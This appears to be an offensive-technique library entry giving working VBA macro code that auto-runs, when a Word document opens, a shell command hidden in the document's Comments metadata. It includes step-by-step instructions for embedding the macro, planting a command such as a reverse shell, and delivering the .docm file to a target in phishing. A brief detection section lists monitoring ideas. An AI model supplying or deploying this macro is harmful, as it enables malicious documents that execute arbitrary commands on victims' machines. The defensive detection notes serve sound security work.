---
id: f8900dc5-3c7c-487f-8660-23936be1c70a
name: VBA-Macro-for-Shell-Execution-via-Comments
type: code
language: vb
verified: true
created_at: '2023-04-06T03:56:23.499064+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - vba-macro
  - execution
  - office-attack
platforms:
  - Windows
validated: true
---

# VBA-Macro-for-Shell-Execution-via-Comments

## Code

```vb
Sub beautifulcomment()
    Dim p As DocumentProperty
    For Each p In ActiveDocument.BuiltInDocumentProperties
        If p.Name = "Comments" Then
            Shell (p.Value)
        End If
    Next
End Sub

Sub AutoExec()
    beautifulcomment
End Sub

Sub AutoOpen()
    beautifulcomment
End Sub
```

## Description

This VBA macro code is designed for embedding in Microsoft Office documents (e.g., Word .docm files) to automatically execute a shell command stored in the document's 'Comments' metadata property. The 'beautifulcomment' subroutine scans built-in document properties for the 'Comments' field and invokes the Windows Shell function on its value, allowing arbitrary command execution. AutoExec and AutoOpen hooks trigger the execution upon document opening or macro run, making it suitable for malicious document delivery in phishing attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| p.Value (Comments) | The shell command payload stored in the document's Comments metadata | `cmd.exe /c calc.exe` or `powershell -c \"command\"" ` |

## Usage

Embed this code in the VBA editor of a macro-enabled Office document (Alt+F11 in Word). Set the Comments property via File > Info > Properties > Advanced Properties > Summary > Comments field with your shell command (e.g., a reverse shell invocation). Save as .docm and deliver to the target. When opened with macros enabled, it executes the command in the user's context. Ideal for initial access in red team simulations or phishing scenarios.

## Detection

- Monitor Office processes (winword.exe, excel.exe) for calls to Shell API or spawning cmd.exe/powershell.exe via EDR tools.
- Enable Microsoft Office macro antivirus scanning and logging (e.g., Script Block Logging for VBA events).
- Scan documents for suspicious AutoOpen/AutoExec macros and unusual property values using tools like O365AT or olevba.py.
- Network monitoring for anomalous outbound connections triggered by the payload.

## Related

- [[procedures/Execute-Shell-Command-via-VBA-Comment-Metadata]]
